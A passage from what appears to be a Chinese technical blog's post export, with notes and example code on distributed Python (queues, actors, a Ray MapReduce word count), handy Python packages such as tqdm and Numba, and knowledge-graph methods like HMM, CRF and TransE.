启动Queue:manager.start()# 获得通过网络访问的Queue对象:task = manager.get_task_queue()result = manager.get_result_queue()# 注册任务for i in range(10): n = random.randint(0, 10000) print('Put task %d...' % n) task.put(n)# 读取结果:print('Try get results...')for i in range(10): r = result.get(timeout=10) print('Result: %s' % r)# 关闭:manager.shutdown()print('master exit.') 1234567891011121314151617181920212223242526272829303132333435363738394041# worker.pyimport time, sys, queuefrom multiprocessing.managers import BaseManager# 可以在多个机器上同时开启多个worker# 创建类似的QueueManager:class QueueManager(BaseManager): pass# 由于这个QueueManager只从网络上获取Queue，所以注册时只提供名字:QueueManager.register('get_task_queue')QueueManager.register('get_result_queue')# 连接到服务器，也就是运行task_master.py的机器:server_addr = '127.0.0.1'print('Connect to server %s...' % server_addr)# 端口和验证码注意保持与task_master.py设置的完全一致:m = QueueManager(address=(server_addr, 5000), authkey=b'abc')# 从网络连接:m.connect()# 获取Queue的对象:task = m.get_task_queue()result = m.get_result_queue()# 从task队列取任务,并把结果写入result队列:for i in range(10): try: n = task.get(timeout=1) print('run task %d * %d...' % (n, n)) r = '%d * %d = %d' % (n, n, n * n) time.sleep(1) result.put(r) except queue.Queue.Empty: print('task queue is empty.')# 处理结束:print('worker exit.') 使用中间件传递消息（基于网络），类似Go语言的channel（基于内存）。 另一种消息传递方式是，直接传递，Actor模型，一般有一个Global Schedule，设计的目的是计算。 Actor消息传递示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# actor.pyfrom queue import Queuefrom threading import Thread, Eventclass ActorExit(Exception): passclass Actor(object): def __init__(self): self._mailbox = Queue() def send(self, msg): \"向_mailbox提交任务\" self._mailbox.put(msg) def recv(self): \"从_mailbox获取任务\" msg = self._mailbox.get() if msg is ActorExit: raise ActorExit() return msg def close(self): self.send(ActorExit) def start(self): \"启动线程执行任务\" self._terminated = Event() t = Thread(target=self._bootstrap) t.daemon = True t.start() def _bootstrap(self): try: self.run() except ActorExit: pass finally: self._terminated.set() def join(self): self._terminated.wait() def run(self): ''' Run method to be implemented by the user ''' while True: msg = self.recv() 12345678910111213141516171819202122232425262728293031323334353637383940# test_actor.pyfrom .actor import Actorfrom threading import Eventclass Result(object): def __init__(self): self._evt = Event() self._result = None def set_result(self, value): self._result = value self._evt.set() # 当执行完成计算任务时，解除block @property def result(self): self._evt.wait() # 等待计算结果程序的执行完成，thread block return self._resultclass Worker(Actor): def submit(self, func, *args, **kwargs): \"注册任务\" r = Result() self.send((func, args, kwargs, r)) return r def run(self): \"重写actor的run逻辑，执行用户程序\" while True: func, args, kwargs, r = self.recv() r.set_result(func(*args, **kwargs))if __name__ == '__main__': worker = Worker() worker.start() r = worker.submit(pow, 2, 4) print('it will not block') print(r.result) Ray 基于Master Slaves，Actor的分布式框架。DOC tutorials。分布计算、深度学习调参等等，可是请问 在下去哪里能领到更多的物理机器呢。。。 Global Scheduler：Master上启动了一个全局调度器，用于接收本地调度器提交的任务，并将任务分发给合适的本地任务调度器执行 Redis Server：Master上启动了一到多个Redis Server用于保存分布式任务的状态信息（ControlState），包括对象机器的映射、任务描述、任务debug信息等。 Local Scheduler：每个Slave上启动了一个本地调度器，用于提交任务到全局调度器，以及分配任务给当前机器的Worker进程 Worker：每个Slave上可以启动多个Worker进程执行分布式任务，并将计算结果存储到Object Store，每一个有全局唯一的 Object ID Object Store：每个Slave上启动了一个Object Store存储只读数据对象，Worker可以通过共享内存的方式访问这些对象数据（通过Object ID），这样可以有效地减少内存拷贝和对象序列化成本。Object Store底层由Apache Arrow实现 Plasma：每个Slave上的Object Store都由一个名为Plasma的对象管理器进行管理，它可以在Worker访问本地Object Store上不存在的远程数据对象时，主动拉取其它Slave上的对象数据到当前机器 Ray简易环境搭建 配置Conda 123$ wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh$ sh Miniconda3-latest-Linux-x86_64.sh 安装Ray，推荐python3.7，其他版本存在已知的Bug（官方） 12345$ conda create --name ray python=3.7$ conda activate ray$ pip install ray Ray 集群搭建: 部署Redis服务(下面假设部署在localhost:6379) 选择任意一台主机作为Master启动 ray start --head --ip localhost --redis-port=6379 在集群其他机器上启动 ray start --address=[head_node_address]:6379 运行一个Map Reduce示例。数据准备，下载Wiki数据，使用WikiExtractor解析： 12$ wget https://dumps.wikimedia.org/enwiki/latest/enwiki-latest-pages-articles-multistream9.xml-p1791081p2336422.bz2$ python WikiExtractor.py -o /data enwiki-latest-pages-articles-multistream9.xml-p1791081p2336422.bz2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144import argparsefrom collections import Counter, defaultdictimport heapqimport numpy as npimport osimport rayparser = argparse.ArgumentParser()parser.add_argument(\"--num-mappers\", help=\"number of mapper actors used\", default=3, type=int)parser.add_argument(\"--num-reducers\", help=\"number of reducer actors used\", default=4, type=int)@ray.remoteclass Mapper(object): def __init__(self, content_stream): self.content_stream = content_stream self.num_articles_processed = 0 self.articles = [] self.word_counts = [] def get_new_article(self): article = self.content_stream.next() # Count the words and store the result. self.word_counts.append(Counter(article.split(\" \"))) self.num_articles_processed += 1 def get_range(self, article_index, keys): \"\"\"keys: list of 2 chars article_index：当前mapper处理的文章index，需要与GlobalScheduler中任务参数进行通信， 保证当前article在整个处理序列中处于article_index的位置\"\"\" # Process more articles if this Mapper hasn't processed enough yet. while self.num_articles_processed &lt; article_index + 1: self.get_new_article() # Return the word counts from within a given character range. return [(k, v) for k, v in self.word_counts[article_index].items() if len(k) &gt;= 1 and k[0] &gt;= keys[0] and k[0] &lt;= keys[1]]@ray.remoteclass Reducer(object): def __init__(self, keys, *mappers): \"针对不同范围的开头字母区间，进行reduce\" self.mappers = mappers self.keys = keys def next_reduce_result(self, article_index): word_count_sum = defaultdict(lambda: 0) # Get the word counts for this Reducer's keys from all of the Mappers # and aggregate the results. count_ids = [ mapper.get_range.remote(article_index, self.keys) for mapper in self.mappers ] # From many Mappers for count_id in count_ids: for k, v in ray.get(count_id): word_count_sum[k] += v return word_count_sumdef get_content(file, floder='/data/'): file = floder + file f = open(file, 'r') return f.read()class Stream(object): \"数据流生成\" def __init__(self, max, folder): \"\"\"max: 最大提取文件数量 folder: 文件夹名称 \"\"\" self.index = 0 self.max = max self.folder = folder self.g = None def init(self): self.g = self.content() def file(self): return f\"wiki_&#123;0&#125;&#123;self.index&#125;\" if self.index &lt; 10 else f\"wiki_&#123;self.index&#125;\" def content(self): while self.index &lt; self.max: yield get_content(self.file(), self.folder) self.index += 1 def next(self): \"生成器\" if not self.g: self.init() return next(self.g)if __name__ == \"__main__\": MAX = 10 args = parser.parse_args() ray.init() # Create one streaming source of articles per mapper. directory = os.path.dirname(os.path.realpath(__file__)) streams = [] folders = ['/data/AA/', '/data/AB/', '/data/AC/'] for i in range(args.num_mappers): streams.append(Stream(MAX, folders[i % len(folders)])) # Partition the keys among the reducers. chunks = np.array_split([chr(i) for i in range(ord(\"a\"), ord(\"z\") + 1)], args.num_reducers) keys = [[chunk[0], chunk[-1]] for chunk in chunks] # Create a number of mappers. mappers = [Mapper.remote(stream) for stream in streams] # Create a number of reduces, each responsible for a different range of # keys. This gives each Reducer actor a handle to each Mapper actor. reducers = [Reducer.remote(key, *mappers) for key in keys] # Most frequent 10 words. article_index = 0 while True: print(\"article index = &#123;&#125;\".format(article_index)) wordcounts = &#123;&#125; counts = ray.get([ reducer.next_reduce_result.remote(article_index) for reducer in reducers ]) for count in counts: wordcounts.update(count) most_frequent_words = heapq.nlargest(10, wordcounts, key=wordcounts.get) for word in most_frequent_words: print(\" \", word, wordcounts[word]) article_index += 1 然后，在每个节点保存一份代码，启动worker和master节点 1234ray start --head --ip localhost --redis-port=6379 # 修改head_node_address为 master 节点的ip地址ray start --address=[head_node_address]:6379 在master运行程序得到结果。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CS","slug":"Notes/CS","permalink":"https://racleray.github.io/categories/Notes/CS/"}],"tags":[{"name":"ray","slug":"ray","permalink":"https://racleray.github.io/tags/ray/"},{"name":"distributed","slug":"distributed","permalink":"https://racleray.github.io/tags/distributed/"},{"name":"asyc","slug":"asyc","permalink":"https://racleray.github.io/tags/asyc/"}]},{"title":"有用的python package","slug":"有用的python-package","date":"2021-02-24T12:19:59.000Z","updated":"2023-08-07T11:54:31.046Z","comments":true,"path":"posts/4e471b0e.html","link":"","permalink":"https://racleray.github.io/posts/4e471b0e.html","excerpt":"记录几个有用的python包。argh处理命令行参数、schedule定时运行脚本等。","text":"argh--懒人版argparse 123456789101112131415161718192021import arghdef do_the_thing(required_arg, optional_arg=1, other_optional_arg=False): \"\"\" I am a docstring \"\"\" print((required_arg, type(required_arg))) print((optional_arg, type(optional_arg))) print((other_optional_arg, type(other_optional_arg)))@argh.arg('--bool-arg-for-flag', '-b', help=\"Flip this flag for things\")@argh.arg('arg_with_choices', choices=['one', 'two', 'three'])def do_the_other_thing(arg_with_choices, bool_arg_for_flag=False): print(arg_with_choices) print(bool_arg_for_flag)if __name__ == '__main__': # argh.dispatch_command(do_the_thing) argh.dispatch_commands([do_the_thing, do_the_other_thing]) msgpack--二进制版json 123456789101112131415161718192021222324252627282930313233343536373839404142import msgpackimport jsonimport randomdef msgpack_example_1(): example_dict = &#123;i: random.random() for i in range(10000)&#125; with open('json_file.json', 'w') as f: json.dump(example_dict, f) with open('json_file.json') as f: back_from_json = json.load(f) # Saving and loading with open('msgpack_file.msgpack', 'wb') as f: # f.write(msgpack.packb(example_dict)) # f.write(msgpack.packb(example_dict, use_single_float=True)) f.write(msgpack.packb(example_dict)) with open('msgpack_file.msgpack', 'rb') as f: back_from_msgpack = msgpack.unpackb(f.read()) # Data integrity print(type(next(iter(back_from_json.keys())))) print(type(next(iter(back_from_msgpack.keys()))))def msgpack_example_2(): list_of_dicts = [&#123;0: random.random()&#125; for i in range(100)] with open('streamed.msgpack', 'wb') as f: for d in list_of_dicts: f.write(msgpack.packb(d)) # 迭代读取 with open('streamed.msgpack', 'rb') as f: loaded_list_of_dicts = [item for item in msgpack.Unpacker(f)] print(list_of_dicts[3][0], loaded_list_of_dicts[3][0])if __name__ == '__main__': # msgpack_example_1() msgpack_example_2() redis_cache--使用redis缓存函数 12345678910111213141516171819# sudo apt install redis-server# sudo systemctl enable redis-server.service# sudo systemctl start redis-server.service# pip/pip3 install git+https://github.com/YashSinha1996/redis-simple-cache.gitimport timefrom redis_cache import cache_it, cache_it_json@cache_it(limit=1000, expire=5)def function_that_takes_a_long_time(i): print(f\"function was called with input &#123;i&#125;\") return i**2if __name__ == '__main__': for i in range(10): print(i, function_that_takes_a_long_time(2)) schedule--定时运行函数 1234567891011121314151617import timeimport scheduledef test_function(): print(f'test called at &#123;time.time()&#125;')def test_function_2(): print(f'test 2 called at &#123;time.time()&#125;')if __name__ == '__main__': schedule.every(1).seconds.do(test_function) schedule.every(3).seconds.do(test_function_2) # schedule.every(1).days.do(daily_task) # schedule.every().thursday.at(\"10:00\").do(day_time_task) while True: schedule.run_pending() tqdm--进度条显示 123456789101112131415161718192021222324252627282930313233343536373839404142434445from tqdm import tqdm, trangeimport randomimport timedef tqdm_example_1(): for i in tqdm(range(10)): time.sleep(0.2)def tqdm_example_2(): for i in trange(10, desc=\"outer_loop\"): for j in trange(10, desc=\"inner_loop\"): time.sleep(0.01)def tqdm_example_3(add_tot=False): max_iter = 100 tot = 0 if add_tot: bar = tqdm(desc=\"update example\", total=max_iter) else: bar = tqdm() while tot &lt; max_iter: update_iter = random.randint(1, 5) bar.update(update_iter) tot += update_iter time.sleep(0.03)def tqdm_example_4(): t = trange(100) for i in t: t.set_description(f\"on iter &#123;i&#125;\") time.sleep(0.02)if __name__ == \"__main__\": # tqdm_example_1() # tqdm_example_2() # tqdm_example_3() # tqdm_example_3(True) tqdm_example_4() Numba--矩阵运算加速 12345678910111213141516171819202122232425262728293031323334353637383940414243import numpy as npfrom numba import njitfrom concurrent.futures import ThreadPoolExecutordef test_func(x): out=0 for i in range(100000000): out += i return outdef test_heavy_func(times): arr = np.random.rand(10000, 10000) return arr * arrif __name__ == \"__main__\": jitted_func = njit(test_func) jitted_func_2 = njit(test_heavy_func) # 计算使用 jit 并 关闭 gil，提升矩阵运算速度 jitted_func_3 = njit(test_heavy_func, nogil=True) import time # start = time.time() # with ThreadPoolExecutor(4) as ex: # ex.map(jitted_func, range(1000)) # end = time.time() # print(\"[Python origin test] Used time: \", end - start) start = time.time() with ThreadPoolExecutor(4) as ex: ex.map(jitted_func_2, range(100)) end = time.time() print(\"[Numpy origin test] Used time: \", end - start) start = time.time() with ThreadPoolExecutor(4) as ex: ex.map(jitted_func_3, range(100)) end = time.time() print(\"[Numpy no gil test] Used time: \", end - start) 注意：在numba中使用一个普通的python列表不是一个好主意，因为它将花费很长时间来验证类型。 使用ndarray，才是正确的方法！才能带来速度的提升。 另外，@vectorize可以将处理一个元素的函数，转换成可以接受 array输入的优化函数，只是第一次使用需要对内存分配进行优化，会慢一些。 12345678@vectorize(nopython=True)def non_list_function(item): if item % 2 == 0: return 2 else: return 1 non_list_function(test_list) 弹簧阻尼系统计算实例 123456789101112131415161718192021222324def friction_fn(v, vt): if v &gt; vt: return - v * 3 else: return - vt * 3 * np.sign(v)def simulate_spring_mass_funky_damper(x0, T=10, dt=0.0001, vt=1.0): times = np.arange(0, T, dt) positions = np.zeros_like(times) v = 0 a = 0 x = x0 positions[0] = x0/x0 for ii in range(len(times)): if ii == 0: continue t = times[ii] a = friction_fn(v, vt) - 100*x v = v + a*dt x = x + v*dt positions[ii] = x/x0 return times, positions 1%time _ = simulate_spring_mass_funky_damper(0.1) 运行280ms，当输入x0为从0到10000，每次增加0.1，需要7个小时 12345678910111213141516171819202122232425262728@njitdef friction_fn(v, vt): if v &gt; vt: return - v * 3 else: return - vt * 3 * np.sign(v)@njitdef simulate_spring_mass_funky_damper(x0, T=10, dt=0.0001, vt=1.0): times = np.arange(0, T, dt) positions = np.zeros_like(times) v = 0 a = 0 x = x0 positions[0] = x0/x0 for ii in range(len(times)): if ii == 0: continue t = times[ii] a = friction_fn(v, vt) - 100*x v = v + a*dt x = x + v*dt positions[ii] = x/x0 return times, positions_ = simulate_spring_mass_funky_damper(0.1) 运行时间 1.99 ms，加速 200x。 再加速： 12345# 使用多线程from concurrent.futures import ThreadPoolExecutorwith ThreadPoolExecutor(8) as ex: ex.map(simulate_spring_mass_funky_damper, np.arange(0, 1000, 0.1)) 当输入x0为从0到1000，每次增加0.1，需要19.3s。 再加速，利用多核，在矩阵运算时，关闭 GIL 锁： 1234567891011121314151617181920212223242526272829@njit(nogil=True)def friction_fn(v, vt): if v &gt; vt: return - v * 3 else: return - vt * 3 * np.sign(v)@njit(nogil=True)def simulate_spring_mass_funky_damper(x0, T=10, dt=0.0001, vt=1.0): times = np.arange(0, T, dt) positions = np.zeros_like(times) v = 0 a = 0 x = x0 positions[0] = x0/x0 for ii in range(len(times)): if ii == 0: continue t = times[ii] a = friction_fn(v, vt) - 100*x v = v + a*dt x = x + v*dt positions[ii] = x/x0 return times, positions# compile：先编译，那么使用时，省去了这段时间_ = simulate_spring_mass_funky_damper(0.1) 1234from concurrent.futures import ThreadPoolExecutorwith ThreadPoolExecutor(8) as ex: ex.map(simulate_spring_mass_funky_damper, np.arange(0, 1000, 0.1)) 当输入x0为从0到1000，每次增加0.1，需要1.83s。 不使用多线程，使用numba自带的多进程并行，也是可以的 12345678910from numba import prange@njit(nogil=True, parallel=True)def run_sims(end=1000): for x0 in prange(int(end/0.1)): if x0 == 0: continue simulate_spring_mass_funky_damper(x0*0.1) run_sims()","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"python","slug":"Tools/python","permalink":"https://racleray.github.io/categories/Tools/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://racleray.github.io/tags/python/"},{"name":"tool","slug":"tool","permalink":"https://racleray.github.io/tags/tool/"}]},{"title":"浅涉知识图谱","slug":"浅涉知识图谱","date":"2021-02-22T13:16:40.000Z","updated":"2023-08-07T11:54:31.047Z","comments":true,"path":"posts/6a1e61f5.html","link":"","permalink":"https://racleray.github.io/posts/6a1e61f5.html","excerpt":"简要记录了知识图谱基本概念，NER模型方法（HMM、MEMM、CRF），关系分类方法，知识表示（Trans系列）等。","text":"基本概念 “A knowledge graph consists of a set of interconnected typed entities and their attributes.” 知识图谱由一些相互连接的实体和他们的属性构成的。 是由一条条知识组成，每条知识表示为一个 SPO 三元组 技术体系简图： SPO相关 SPO三元组：（实体，关系，实体），（实体，属性，字面量） 构建的难点之一就是，Schema设计。 设计知识图谱的结构，要构建哪些类别的实体，实体有什么属性，实体间有什么关系，关系有什么属性 SPO的背后 RDF(Resource Description Framework)，即资源描述框架，其本质是一个数据模型（Data Model）。RDF形式上表示为SPO三元组。 RDF由节点和边组成，节点表示实体/资源、属性，边则表示了实体和实体之间的关系以及实体和属性的关系。 RDF的表达能力有限，无法区分类和对象，也无法定义和描述类的关系/属性。就是不能反映一个 类 的特征信息。 RDFS/OWL 用来描述RDF数据。RDFS/OWL序列化方式和RDF没什么不同，其实在表现形式上，它们就是RDF。 RDFS，即“Resource Description Framework Schema”，是最基础的模式语言。定义了类，将类进行抽象。 RDFS的表达能力还是相当有限，因此提出了OWL，Web Ontology Language。我们也可以把OWL当做是RDFS的一个扩展，其添加了额外的预定义词汇。 owl区分数据属性和对象属性（对象属性表示实体和实体之间的关系）。 OWL 使用场景：本体结构中有大量相互链接的类和属性，设计者想用自动推理机得到里面复杂的关系。需要结合基于规则的推理引擎（rule-based reasoning engine）的场合。 命名实体识别 概率图方法 有向图 ⽆向图 概率⽆无向图模型，⼜称为⻢马尔可夫随机场 它假设随机场中任意⼀一个结点的赋值，仅仅和它的邻结点的取值有关，和不不相邻的结点的取值无关。⽆向图G中任何两个结点均有边连接的结点⼦集称为团。 若C是⽆向图的⼀个团，且不能再加进任何一个G的结点使其成为更大的⼀个团，则此C为最⼤团。 联合概率可以表示为其最大团C 随机变量的函数的乘积。 成对⻢马尔可夫性：没有直连边的任意两个节点是独立的。 局部⻢马尔可夫性：给定直连节点时，中心节点和其他节点条件独立。 全局⻢马尔可夫性：给定一个节点集合将全集划分为两个独立集合时，两个点集的任意子集，是相互独立的。 HMM HMM是⽤用于描述由隐藏的状态序列列和显性 的观测序列列组合⽽而成的双重随机过程。 通过可观测到的数据，预测不不可观测到的状态数据。 HMM的假设⼀：⻢马尔可夫性假设。当前时刻的状态值，仅依赖于前 ⼀时刻的状态值，⽽不依赖于更早时刻的状态值。 HMM的假设⼆：⻬次性假设。状态转移概率矩阵与时间⽆关。即所 有时刻共享同⼀个状态转移矩阵。 HMM的假设三：观测独⽴立性假设。当前时刻的观察值，仅依赖于当 前时刻的状态值。 此处的问题是，预测隐状态序列（假设模型参数已经学习得到）。实例演示： 已知： 状态值集合：{晴天，阴天，⾬雨天}；观测值集合：{宅，打球}； 过去状态值序列：{晴晴晴阴⾬雨晴}；对应观测值序列：{球宅宅球宅宅}； 从历史数据学习，已得到模型参数为： 求当观测序列是{宅球宅}，最有可能的天⽓状况序列？（动态规划求解概率最⼤大路路径） 求解过程： 定义: 定义在时刻t状态为i的所有单个路径（i1，i2，... it )中的概率最大值为 t+1时刻的最大概率: 再定义⼀个变量，⽤来回溯最⼤路径：在时刻t状态i的所有单个路径（i1，i2，，， it-1,it)中，概率最⼤的路路径第t-1个节点为（在t时刻选出上一个时刻的最优路径）： 计算第一天 \\(\\delta_1\\)（雨天）= \\(\\pi\\)(雨天) * B(雨天，宅) = 0.28 \\(\\delta_1\\)（阴天）= \\(\\pi\\)(阴天) * B(阴天，宅) = 0.16 \\(\\delta_1\\)（晴天）= \\(\\pi\\)(晴天) * B(晴天，宅) = 0.1 第二天 \\(\\delta_2\\)（雨天）= \\(\\max\\)( [\\(\\delta_1\\)(雨天) * A(雨天，雨天)， \\(\\delta_1\\)(阴天) * A(阴天，雨天)， \\(\\delta_1\\)(晴天) * A(晴天，雨天)]) * B(雨天，打球) = 0.042 ​ 前一时刻选择，雨天 \\(\\delta_2\\)（阴天）= \\(\\max\\)( [\\(\\delta_1\\)(雨天) * A(雨天，阴天)， \\(\\delta_1\\)(阴天) * A(阴天，阴天)， \\(\\delta_1\\)(晴天) * A(晴天，阴天)]) * B(阴天，打球) = 0.0504 ​ 前一时刻选择，雨天 \\(\\delta_2\\)（晴天）= \\(\\max\\)( [\\(\\delta_1\\)(雨天) * A(雨天，晴天)， \\(\\delta_1\\)(阴天) * A(阴天，晴天)， \\(\\delta_1\\)(晴天) * A(晴天，晴天)]) * B(晴天，打球) = 0.028 ​ 前一时刻选择，雨天 第三天 \\(\\delta_3\\)（雨天）= \\(\\max\\)( [\\(\\delta_2\\)(雨天) * A(雨天，雨天)， \\(\\delta_2\\)(阴天) * A(阴天，雨天)， \\(\\delta_2\\)(晴天) * A(晴天，雨天)]) * B(雨天，打球) = 0.0147 ​ 前一时刻选择，雨天 \\(\\delta_3\\)（阴天）= \\(\\max\\)( [\\(\\delta_2\\)(雨天) * A(雨天，阴天)， \\(\\delta_2\\)(阴天) * A(阴天，阴天)， \\(\\delta_2\\)(晴天) * A(晴天，阴天)]) * B(阴天，打球) = 0.01008 ​ 前一时刻选择，阴天 \\(\\delta_3\\)（晴天）= \\(\\max\\)( [\\(\\delta_2\\)(雨天) * A(雨天，晴天)， \\(\\delta_2\\)(阴天) * A(阴天，晴天)， \\(\\delta_2\\)(晴天) * A(晴天，晴天)]) * B(晴天，打球) = 0.00756 ​ 前一时刻选择，阴天 最后，选择t3时刻最大路径，雨天。回溯结果为，{雨天，雨天，雨天} HMM的缺陷 ⻢尔可夫性（有限历史性）：实际上在NLP领域的文本数据，很多词语都是有⻓依赖的。 齐次性：序列列不同位置的状态转移矩阵可能会有所变化，即位置信息会影响预测结果。 观测独立性：观测值和观测值（字与字）之间是有相关性的。 单向图：只与前序状态有关，和后续状态无关。在NLP任务中，上下文的信息都是必须的。 标记偏置Label Bias：若状态A能够向N种状态转移，状态B能够向M种状态转移。若N&lt;&lt;M，则预测序列更有可能选择状态A，因为A的局部转移概率较大 MEMM最大熵马尔可夫模型 解决了观测独立问题，但是依然存在标记偏置。 最大熵（熵：分布的不确定性）： “无知比错误更可取，一个什么都不相信的人比一个相信错误的人离真理更近” 找到最优分布中，最偏向 uniform 的结果，即为最大熵的目标。 H（x）=–∑x log x是凸函数 最大熵模型的likeliihood形式为： 求导之后可以发现： MEMM： 根据历史状态序列，预测当前状态，每一时间步，预测一个状态。 CRF 在给定随机变量序列X的情况下，随机变量Y的条件概率分布P(Y|X)构成条件随机场，即满⾜足马尔可夫性： P(Yi| X,Y1,Y2,...Yn) = P(Yi| X,Yi−1,Yi+1) 则称P(Y|X)为线性链条件随机场。 传统的CRF定义如下： 特征函数分为两类 只和当前节点有关 只和当前节点和上⼀个节点有关，局部特征函数 linear-CRF由 tk, λk, sl, µl 共同决定 i -- 表示从0到T的序列位置；k, l -- 表示自定义的特征函数编号。 在深度学习中使用时，用深度模型代替特征函数： CRF相对于HMM的优点 规避了马尔可夫性，能够获取长文本的远距离依赖的信息 规避了齐次性，并且序列的 位置信息会影响预测出的状态序列 规避了观测独立性，观测值之间的相关性信息能够被提取 不是单向图，而是无向图，能够充分提取上下文信息作为特 征 改善了标记偏置Label Bias问题 CRF的思路是利用多个特征，对状态序列进行预测。HMM 的表现形式使他无法使⽤多个复杂特征 CRF的缺点 CRF训练代价大、复杂度高 需要人为构造特征函数，特征工程对CRF模型的影响很大 实体连接 候选实体生成： 根据输入文本中检测出的实体mention集合M，从给定知识图谱中找到可能属于M的候选实体集合m 候选实体排序： 负责对候选实体集合m中多个候选实体打分的排序， 并输出得分最高的候选实体，作为实体链接结果 关系分类简介 关系抽取: 从一个句子中判断两个entity是否有关系，一般是一个二分类问题，指定某种关系 关系分类: 一般是判断一个句子中两个entity是哪种关系，属于多分类问题。 标注工具: BRAT BRAT是一个基于web的文本标注工具，主要用于对文本的结构化标注，用BRAT生成的标注结果能够把无结构化的原始文本结构化，供计算机处理。利用该工具可以方便的获得各项NLP任务需要的标 注语料。 方法： 基于规则的方法——人工模板 基于规则的方法——基于统计的方法 基于监督学习的方法——CNN/RNN 基于监督学习的方法——PCNN 半监督学习的方法——自举 半监督学习的方法——远程监督 基于统计的方法 输入关系集合中的一个 搜索一组实体对，满足关系 输入实体对，搜索包含实体对的句子，保存 将保存句子中的实体对，使用同一类关系模版替换 计算成功替换，模版匹配正确的比例，即概率，作为模版的得分（置信度）。留下得分高的模版 神经网络方法 输入embedding，可加上相对位置embedding，训练分类器。 PCNN的Piecewise Convolutional，只是使用Piecewise max pooling，从实体所在位置处，分段进行pooling。 半监督 Bootstrapping 创建空的列表； 使用精心选择的种子初始化列表； 利用列表中的内容从训练语料库中查找更多内容； 给那些新发现的内容打分；把得分最高的内容加到列表中。 重复步骤3和4，直到达到最大迭代次数或者其它停止条件为止。 Snowball优化了部分的细节 定义pattern 成为&lt;left, tag1, middle, tag2, right&gt;; tuples 为 &lt;tag1 , tag2&gt; 生成新pattern时，评估其与已有pattern的相似性，取一个阈值之上的，加入pattern集合。 tuples要经过可信度计算，选择可信度高的留下，计算方法看论文或者blog吧。 远程监督 将已有的知识对应到丰富的非结构化语料中从而生成大量的训练数据。知识来源：人工标注、现有的知识库、特定的语句结构。 Distant supervised 会产生有大量噪音或者被错误标注的数据，直接使用supervised的方法进行关系分 类，效果很差。 知识表示Embedding TransE TransE，⼀种将实体与关系嵌⼊到低维向量空间中的简单模型 。该模型已经成为了知识 图谱向量化表示的 baseline，并衍⽣出不同的变体。原理简述： h，t为实体向量，r为关系向量。 以L2 距离为例，梯度的计算相对⽐较简单，⽬标函数变为 求解导数： 完整算法： 评测方法： 在测试时，以⼀个三元组为例，⽤语料中所有实体替换当前三元组的头实体计算距离d(h ′+l,t)，将结果按升序排序，⽤正确三元组 的排名情况来评估学习效果（同理对尾实体这样做）。(若替换到在训练集中的三元组，可以选择 删掉) 度量标准选择hits@10和mean rank，前者代表 命中前10的次数/总查询次数，后者代表 正确结果排名之和/总查询次数 训练速度快、易于实现。另外，可以将word2vec和TransE一起融合训练，此处不作展开。 TransH 虽然 TransE 模型具有训练速度快、易于实现等优点，但是它不能够解决多对⼀和⼀对多关系的问题。以 多对⼀关系为例，固定 r 和 t，TransE 模型为了满⾜三⻆闭包关系，训练出来的头节点的向量会很相似。⽽TransH是⼀种将头尾节点映射到关系平⾯的模型，能够很好地解决这⼀问题。 对于多对⼀关系，TransH 不在严格要求 h+r-l=0，⽽是只需要保证头结点和尾节点在关系平 ⾯上的投影在⼀条直线上即可。 TransR TransE 和 TransH 都假设实体和关系嵌⼊在相同的空间中。然⽽，⼀个实体是多种属性的综合体，不同关 系对应实体的不同属性，即头尾节点和关系可能不在⼀个向量空间中。 TransD TransR同样有它的问题，首先对于一种关系，它的头实体和尾实体使用同样的变换矩阵映射到关系空间，而头实体和尾实体往往是完全不同类的实体，也应该使用不同的方法进行映射。 TransD模型对每个实体或关系使用两个向量进行表示，一个向量表示语义，另一个（用下表p表示）用来构建映射矩阵。 问答应用 基于知识图谱的问答KBQA 基本流程： ⾃然语⾔查询--&gt;意图识别(Intention Recognition)--&gt;实体链指(Entity Linking)+关系识别(Relation Detection) --&gt; 查询语句拼装(Query Construction)--&gt;返回结果选择(Answering Selection) 意图识别(Intention Recognition)：预先准备好意图模板，可以通过相似度来匹配，也可以通过机器学习⾥的 分类问题来解决，这个是所有问答系统都要⾯临的问题。 实体链指(Entity Linking)+关系识别(Relation Detection)：将查询语句中出现的实体和关系映射到知识图谱⾥，本质是⼀个NER问题，只是需要将NER结果进⼀步链接到图谱。 查询语句拼装(Query Construction)：需要根据底层知识图谱的查询语⾔，拼装成对应的query来查询(sparq 等)，最简单的⽅法就是预先定义好查询模板，根据之前解析出来的(意图，实体，关系)填进模板查询即可。 返回结果选择(Answering Selection)：图谱查询之后的结果可能存在多个，需要选择⼀个最合适的答案，可 以预先指定排序规则去选择答案。 参考： 实例：NL2SQL比赛第三名方案，待学习 基于知识表示的问答KEQA KEQA KEQA的目标不是直接推断头部实体和谓词，而是联合恢复知识图嵌入空间中问题的头部实体、谓词和尾部实体表示(eh, p, et)。分别训练两个模型，一个学习 谓词p 和 实体e 的表示，一个识别问题中到的Head实体。如下面两个图所示。 Entity Linking: Finding Extracted Entities in a Knowledge Base ↩︎ Improved Neural Relation Detection for Knowledge Base Question Answering ↩︎","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"relation extraction","slug":"relation-extraction","permalink":"https://racleray.github.io/tags/relation-extraction/"},{"name":"NER","slug":"NER","permalink":"https://racleray.github.io/tags/NER/"},{"name":"TransE","slug":"TransE","permalink":"https://racleray.github.io/tags/TransE/"},{"name":"Knowledge Graph","slug":"Knowledge-Graph","permalink":"https://racleray.github.io/tags/Knowledge-Graph/"}]},{"title":"BERT-flow and more","slug":"BERT-flow-and-more","date":"2021-02-12T16:10:19.000Z","updated":"2023-08-07T11:54:31.025Z","comments":true,"path":"posts/a954bb00.html","link":"","permalink":"https://racleray.github.io/posts/a954bb00.html","excerpt":"记录对BERT-flow模型论文的一点思考，以及记录苏剑林提出的更简单的矩阵空间变换方法解决句子向量表达能力不理想的问题。","text":"论文: On the Sentence Embeddings from Pre-trained Language Models Author: Bohan Li, Hao Zhou, Junxian He, Mingxuan Wang, Yiming Yang, Lei Li Organization: ByteDance AI 